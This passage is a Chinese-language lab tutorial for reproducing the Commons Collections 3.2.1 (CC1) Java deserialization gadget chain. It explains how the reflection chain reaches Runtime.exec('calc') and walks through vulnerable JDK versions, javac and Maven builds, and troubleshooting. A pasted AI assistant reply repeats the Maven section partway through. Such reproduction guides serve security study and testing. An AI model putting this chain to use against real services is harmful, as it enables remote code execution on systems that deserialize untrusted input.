| 2    | `InvokerTransformer("getMethod")` | `Class<Runtime>`     | `Runtime.class.getMethod("getRuntime", ...)`        | `Method<getRuntime>`    |
| 3    | `InvokerTransformer("invoke")`    | `Method<getRuntime>` | `method.invoke(null, ...)` → `Runtime.getRuntime()` | `Runtime` 实例          |
| 4    | `InvokerTransformer("exec")`      | `Runtime` 实例       | `runtime.exec("calc")`                              | `Process`（命令已执行） |

### 🔑 关键点总结

1. **`ChainedTransformer` 本身无害**，只是按顺序调用 `transform()`；
2. **真正的危险来自 `InvokerTransformer`**：它能任意调用方法（反射）；
3. **`ConstantTransformer` 用于“注入”起始类**（如 `Runtime.class`）；
4. 整个链依赖 **Java 反射机制**，通过 `getMethod` + `invoke` 绕过直接调用限制；
5. 最终效果等价于：

```
Runtime.getRuntime().exec("calc");
```

# 五、测试

## 📌方法一：**手动编译与运行**

"⚠️ 注意：此漏洞利用需要目标系统存在反序列化漏洞（即存在可反序列化用户输入的代码），仅测试代码本身不包含漏洞。"

✅ 环境检查

| 项目          | 要求                                                         |
| ------------- | ------------------------------------------------------------ |
| **操作系统**  | Windows / macOS / Linux（命令略有不同）                      |
| **Java 版本** | Java 版本JDK ≤ 8u71（漏洞修复版本为JDK 8u72及更高版本，推荐使用JDK 8u66或更早版本）可通过 `java -version` 查看 |
| **依赖库**    | 依赖库commons-collections-3.2.1.jar（⚠️必须是3.2.1或更早，3.2.2及以上已修复此漏洞）（⚠️必须是 3.2.1 或更早） |

> 💡 如果你不确定 Java 版本是否支持，可以先尝试运行，如果没弹计算器，很可能是版本太高（漏洞已修复）。

------

📥 第一步：下载依赖库

打开浏览器，访问：

```
https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/
```

下载文件：

```
commons-collections-3.2.1.jar
```

将它保存到你的工作目录，比如：

```
/exploit-demo/commons-collections-3.2.1.jar
```

📂 第二步：创建项目目录结构

打开终端（Windows 用 CMD/PowerShell，macOS/Linux 用 Terminal），执行：

```
mkdir exploit-demo
cd exploit-demo
```

然后创建源码目录：

```
mkdir -p src/com/example
```

最终目录结构应为：

```
exploit-demo/
├── commons-collections-3.2.1.jar
└── src/
    └── com/
        └── example/
            └── CC1_Exploit.java   ← 你要放的代码
```

📝 第三步：保存代码到文件

用任意文本编辑器（如 VS Code、Notepad++、vim）创建文件：

```
src/com/example/CC1_Exploit.java
```

把之前给你的 **“完整可运行示例”** 粘贴进去。

> ⚠️ 注意：如果你用的是 **macOS 或 Linux**，请修改最后一行命令：

```
// Windows
new Object[]{"calc.exe"}

// macOS
new Object[]{"open", "/Applications/Calculator.app"}

// Linux (GNOME)
new Object[]{"gnome-calculator"}
```

🔧 第四步：编译 Java 代码

回到终端，在 `exploit-demo` 目录下执行编译命令：

Windows（CMD/PowerShell）：

```
javac -cp ".;commons-collections-3.2.1.jar" src/com/example/CC1_Exploit.java
```

macOS / Linux（Bash/Zsh）：

```
javac -cp ".:commons-collections-3.2.1.jar" src/com/example/CC1_Exploit.java
```

✅ 如果没有报错，说明编译成功！你会看到生成了 `.class` 文件：

```
src/com/example/CC1_Exploit.class
```

▶️ 第五步：运行程序（触发反序列化）

继续在终端执行：

Windows：

```
java -cp ".;commons-collections-3.2.1.jar;src" com.example.CC1_Exploit
```

macOS / Linux：

```
java -cp ".:commons-collections-3.2.1.jar:src" com.example.CC1_Exploit
```

❌ 如果没弹出计算器？排查指南

| 问题                                                         | 解决方案                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| **没反应，也没报错**                                         | 很可能 JDK 版本太高（≥8u72），请换低版本 JDK                 |
| **ClassNotFoundException**                                   | 检查 `-cp` 路径是否包含 `commons-collections-3.2.1.jar` 和 `src` |
| **AccessControlException**                                   | 某些安全策略限制反射，尝试关闭 SecurityManager（一般开发环境没问题） |
| **macOS/Liunx 命令无效**                                     | 确认命令是否存在，比如 `which gnome-calculator`              |
| **提示 “sun.reflect.annotation.AnnotationInvocationHandler” not found** | 说明 JDK 版本过低（如 JDK 6）或过高（模块化后路径变化），建议用 **JDK 8u66** |

✅ 确保`innerMap`至少有一个entry（`innerMap.put("value", "anything");`），否则不会触发转换。

## 📌方法二：**使用 Maven 进行自动化构建与测试**

使用构建工具（如 Maven）来管理依赖和编译过程是标准做法。这种方法更加高效和规范，可以避免手动管理 JAR 包和复杂的 classpath 设置

✅ **前提条件检查**

| 项目          | 要求                                      | 如何检查      |
| ------------- | ----------------------------------------- | ------------- |
| **操作系统**  | Windows / macOS / Linux                   | -             |
| **Java 版本** | JDK ≤ 8u71 (推荐 **JDK 8u66** 或更早版本) | java -version |
| **Maven**     | 3.0 或更高版本                            | mvn -version  |

💡 如果你没有安装 Maven，请先从 [Maven 官网](https://www.google.com/url?sa=E&q=https%3A%2F%2Fmaven.apache.org%2Fdownload.cgi) 下载并根据其指南进行安装配置

------

📂 **第一步：创建 Maven 项目**

1. 打开你的终端（CMD, PowerShell, Terminal）。

2. 进入一个你希望存放项目的工作目录（例如 cd C:\Users\YourUser\Documents）。

3. 运行以下 Maven 命令来通过模板创建一个新的 Java 项目：

   mvn archetype:generate -DgroupId=com.example.cc1 -DartifactId=cc1-exploit-demo -DpackageName=com.example.cc1 -Dversion=1.0-SNAPSHOT -DinteractiveMode=false

- 这个命令会自动创建一个名为 cc1-exploit-demo 的文件夹，并生成标准的 Maven 项目结构。

​    进入项目目录：

​      cd cc1-exploit-demo


这是一个非常好的想法！为你的文档增加一个使用 Maven 的测试流程，会让它显得更加专业和贴近真实开发场景。

我的建议是：**不要删除你原来的手动测试方法，而是在其后增加一节，作为“方法二：使用 Maven 自动化构建与测试”。**

这样做有几个好处：

1. **循序渐进**：手动方法能让初学者更好地理解 javac 和 classpath 的底层原理。
2. **覆盖全面**：Maven 方法展示了现代 Java 项目的标准工作流，更具实用性。
3. **满足不同读者**：有些读者可能没有安装 Maven，他们依然可以使用第一种方法。

下面，我为你完整地梳理了**使用 Maven 进行测试的全部流程**。你可以将这部分内容直接添加到你的文档中。

------

### **方法二：使用 Maven 进行自动化构建与测试**

对于现代Java项目开发，使用构建工具（如 Maven）来管理依赖和编译过程是标准做法。这种方法更加高效和规范，可以避免手动管理 JAR 包和复杂的 classpath 设置。

✅ **前提条件检查**

| 项目          | 要求                                      | 如何检查      |
| ------------- | ----------------------------------------- | ------------- |
| **操作系统**  | Windows / macOS / Linux                   | -             |
| **Java 版本** | JDK ≤ 8u71 (推荐 **JDK 8u66** 或更早版本) | java -version |
| **Maven**     | 3.0 或更高版本                            | mvn -version  |

> 💡 如果你没有安装 Maven，请先从 [Maven 官网](https://www.google.com/url?sa=E&q=https%3A%2F%2Fmaven.apache.org%2Fdownload.cgi) 下载并根据其指南进行安装配置。

------



📂 **第一步：创建 Maven 项目**

1. 打开你的终端（CMD, PowerShell, Terminal）。

2. 进入一个你希望存放项目的工作目录（例如 cd C:\Users\YourUser\Documents）。

3. 运行以下 Maven 命令来通过模板创建一个新的 Java 项目：

   codeBash

   ```
   mvn archetype:generate -DgroupId=com.example.cc1 -DartifactId=cc1-exploit-demo -DpackageName=com.example.cc1 -Dversion=1.0-SNAPSHOT -DinteractiveMode=false
   ```

   - 这个命令会自动创建一个名为 cc1-exploit-demo 的文件夹，并生成标准的 Maven 项目结构。

4. 进入项目目录：

   codeBash

   ```
   cd cc1-exploit-demo
   ```

你现在看到的目录结构应该是这样的：

cc1-exploit-demo/
├── src/
│   ├── main/
│   │   └── java/
│   │       └── com/
│   │           └── example/
│   │               └── cc1/
│   │                   └── App.java   <-- 模板自带的文件
│   └── test/
│       └── ...
└── pom.xml                             <-- 项目的核心配置文件

------

📝 **第二步：配置 pom.xml 文件**

pom.xml 是 Maven 项目的“心脏”，我们在这里声明项目依赖和配置。

1. 用如 VS Code, Notepad++, IntelliJ IDEA 打开项目根目录下的 pom.xml 文件。
2. **将文件的全部内容替换为**以下配置：

<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.example.cc1</groupId>
    <artifactId>cc1-exploit-demo</artifactId>
    <version>1.0-SNAPSHOT</version>
    
    <properties>
        <!-- 强制使用 Java 8 和 UTF-8 编码 -->
        <maven.compiler.source>1.8</maven.compiler.source>
        <maven.compiler.target>1.8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>
    
    <dependencies>
        <!-- 
            核心依赖：commons-collections 3.2.1 版本
            Maven 会自动从中央仓库下载这个 JAR 包
        -->
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
    
    <build>
        <plugins>
            <!-- 添加 exec-maven-plugin 插件，方便我们直接运行主类 -->
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>exec-maven-plugin</artifactId>
                <version>3.1.0</version>
                <configuration>
                    <!-- 指定要运行的主类 -->
                    <mainClass>com.example.cc1.CC1_Exploit</mainClass>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>

- **关键点**：
  - <dependency> 部分会自动下载 commons-collections-3.2.1.jar。
  - <properties> 部分确保了项目会使用 Java 8 进行编译。
  - exec-maven-plugin 插件让我们能用一个简单的命令来运行代码。

------

💻 **第三步：放置并修改漏洞利用代码**

1. 删除模板生成的 App.java 文件：
   - src/main/java/com/example/cc1/App.java
2. 在相同的目录下，创建一个新的 Java 文件 CC1_Exploit.java：
   - src/main/java/com/example/cc1/CC1_Exploit.java
3. 将你的完整漏洞利用代码粘贴到这个新文件中。
4. **重要**：确保代码的 package 声明与你的项目路径一致。文件的第一行应该是：

package com.example.cc1;

1. **再次确认**：根据你的操作系统，修改代码中要执行的命令。
   - **Windows**: new Object[]{"calc.exe"}
   - **macOS**: new Object[]{"open", "-a", "Calculator"}
   - **Linux (GNOME)**: new Object[]{"gnome-calculator"}

▶️ **第四步：编译并运行程序**

现在，所有准备工作都已就绪。

1. 回到你的终端，确保你仍然在 cc1-exploit-demo 项目的根目录下。

2. **编译项目**：运行以下命令。Maven 会自动下载依赖并编译你的代码。

   mvn compile

​    3.**运行程序（触发漏洞）**：运行以下命令。

​       mvn exec:java

------

❌ **如果没弹出计算器？排查指南**

| 问题                         | 可能原因与解决方案                                           |
| ---------------------------- | ------------------------------------------------------------ |
| **mvn 命令未找到**           | Maven 未安装或未配置到系统环境变量 PATH 中。                 |
| **构建失败 (BUILD FAILURE)** | 仔细阅读错误信息。通常是 pom.xml 文件有语法错误，或者网络问题导致依赖下载失败。 |
| **程序运行但无反应**         | 99% 的可能是你的 **JDK 版本过高**（> 8u71），漏洞已被修复。请务必切换到存在漏洞的旧版本 JDK。 |
| **ClassNotFoundException**   | 检查 pom.xml 中的依赖是否正确。运行 mvn clean install 强制重新构建。 |
| **主类找不到错误**           | 检查 pom.xml 中 exec-maven-plugin 的 <mainClass> 配置是否与你的代码包名和类名完全一致。 |